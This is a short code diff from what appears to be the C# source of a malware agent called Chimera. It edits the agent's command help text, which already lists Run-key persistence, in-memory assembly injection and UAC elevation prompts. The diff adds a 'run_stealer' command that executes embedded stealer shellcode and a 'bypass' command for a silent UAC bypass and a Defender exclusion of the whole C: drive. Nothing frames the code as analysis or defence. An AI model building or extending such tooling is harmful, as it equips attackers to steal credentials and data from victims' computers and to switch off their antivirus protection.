@@ -21,6 +21,8 @@ namespace Chimera.Commands
             sb.AppendLine("persist                  Copy agent to AppData and set HKCU Run key");
             sb.AppendLine("inject_assembly <args>   Load embedded .NET DLL in-memory and call Run()");
             sb.AppendLine("runas_exec <cmd>         Run command via runas verb (UAC elevation prompt)");
+            sb.AppendLine("run_stealer             Execute embedded stealer shellcode (inject_assembly)");
+            sb.AppendLine("bypass                  Try silent UAC bypass and add Defender C:\\ exclusion");
             sb.AppendLine("kill                     Terminate agent process");
             sb.AppendLine("help                     Show this help");
             return sb.ToString();
